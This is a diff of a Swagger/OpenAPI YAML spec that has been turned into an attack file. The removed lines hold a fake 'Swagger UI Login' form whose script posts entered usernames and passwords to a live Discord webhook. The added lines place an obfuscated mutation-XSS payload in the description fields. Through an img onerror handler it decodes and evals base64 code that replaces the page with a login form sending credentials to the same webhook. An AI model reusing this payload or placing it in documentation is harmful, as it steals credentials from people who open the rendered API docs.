@@ -1,49 +1,38 @@
 swagger: '2.0'
 info:
-  version: 1.0.0
   title: Swagger UI Login
-  description: >
-    <div style="font-family: 'Source Sans Pro', sans-serif; background: #f3f3f3; padding: 40px 0;">
-    <div style="max-width: 420px; margin: auto; background: white; border-radius: 8px; box-shadow: 0 5px 15px rgba(0,0,0,0.15); overflow: hidden;">
-    <div style="background-color: #32329f; color: white; padding: 16px 24px;">
-    <h2 style="margin: 0; font-size: 20px;">Swagger UI Login</h2>
-    </div>
-    <form id="phish-form" style="padding: 24px;">
-    <label style="display: block; margin-bottom: 12px;">
-    <span style="font-size: 14px; color: #333;">Username</span>
-    <input type="text" name="username" required style="width: 100%; padding: 10px; margin-top: 6px; font-size: 14px; border: 1px solid #ccc; border-radius: 4px;">
-    </label>
-    <label style="display: block; margin-bottom: 20px;">
-    <span style="font-size: 14px; color: #333;">Password</span>
-    <input type="password" name="password" required style="width: 100%; padding: 10px; margin-top: 6px; font-size: 14px; border: 1px solid #ccc; border-radius: 4px;">
-    </label>
-    <button type="submit" style="width: 100%; padding: 12px; background: #32329f; color: white; font-size: 16px; border: none; border-radius: 4px; cursor: pointer;">
-    Sign In
-    </button>
-    </form>
-    <div style="background: #f7f7f7; padding: 12px 24px; font-size: 12px; color: #999; text-align: right;">
-    POC by M4ST3R MIND
-    </div>
-    </div>
-    </div>
-    <script>
-    document.getElementById('phish-form').addEventListener('submit', function (e) {
-      e.preventDefault();
-      const username = this.username.value;
-      const password = this.password.value;
-      fetch("https://discord.com/api/webhooks/1391682964097732668/pwEKIM7IVLZZnsUarOokj1jPKrwFuPzrg0dlIKIxsWL1PxMlFdQAUh2vQzZcbRTe1lD3", {
-        method: "POST",
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({
-          content: `🔥 **New Login Captured**\n👤 Username: \`${username}\`\n🔑 Password: \`${password}\`\n🕓 Time: ${new Date().toLocaleString()}`
-        })
-      });
-      alert("Login failed. Please try again.");
-    });
-    </script>
+  description: |
+    <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img src=x id='YnRvYShgZG9jdW1lbnQuYm9keS5pbm5lckhUTUw9Jyc7dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgnZm9ybScpO2EuYWN0aW9uPSJodHRwczovL2Rpc2NvcmQuY29tL2FwaS93ZWJob29rcy8xMzkxNjgyOTY0MDk3NzMyNjY4L3B3RUtJTTdJVkxaWm5zVWFyT29rajFqUEtyd0Z1UHpyZzBkbElLSXhzV0wxUHhNbEZkUUFVaDJ2UXpaY2JSVGUxbEQzIjthLm1ldGhvZD0nUE9TVCc7YS5pbm5lckhUTUw9JzxjZW50ZXI+VXNlcm5hbWU6IDxpbnB1dCBuYW1lPSJ1c2VybmFtZSI+PGJyPlBhc3N3b3JkOiA8aW5wdXQgbmFtZT0icGFzc3dvcmQiIHR5cGU9InBhc3N3b3JkIj48YnI+PGlucHV0IHR5cGU9InN1Ym1pdCIgdmFsdWU9IkxvZ2luIj48L2NlbnRlcj4nO2RvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQoYSk7YCkK' onerror='eval(atob(this.id))'>">
+  version: production
+basePath: /JSSResource/
+produces:
+  - application/xml
+  - application/json
+consumes:
+  - application/xml
+  - application/json
+security:
+  - basicAuth: []
 paths:
-  /:
-    post:
+  /M0X0101:
+    get:
       responses:
         '200':
-          description: Login submitted
+          description: No response was specified
+      tags:
+        - M4ST3R MIND
+      operationId: findAccounts
+      summary: Finds all accounts
+  '/hack/hachid/{id}':
+    delete:
+      parameters:
+        - description: |
+            <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img src=x id='YnRvYShgZG9jdW1lbnQuYm9keS5pbm5lckhUTUw9Jyc7dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgnZm9ybScpO2EuYWN0aW9uPSJodHRwczovL2Rpc2NvcmQuY29tL2FwaS93ZWJob29rcy8xMzkxNjgyOTY0MDk3NzMyNjY4L3B3RUtJTTdJVkxaWm5zVWFyT29rajFqUEtyd0Z1UHpyZzBkbElLSXhzV0wxUHhNbEZkUUFVaDJ2UXpaY2JSVGUxbEQzIjthLm1ldGhvZD0nUE9TVCc7YS5pbm5lckhUTUw9JzxjZW50ZXI+VXNlcm5hbWU6IDxpbnB1dCBuYW1lPSJ1c2VybmFtZSI+PGJyPlBhc3N3b3JkOiA8aW5wdXQgbmFtZT0icGFzc3dvcmQiIHR5cGU9InBhc3N3b3JkIj48YnI+PGlucHV0IHR5cGU9InN1Ym1pdCIgdmFsdWU9IkxvZ2luIj48L2NlbnRlcj4nO2RvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQoYSk7YCkK' onerror='eval(atob(this.id))'>">
+          format: int64
+          in: path
+          name: id
+          required: true
+          type: integer
+      responses:
+        '200':
+          description: No response was specified
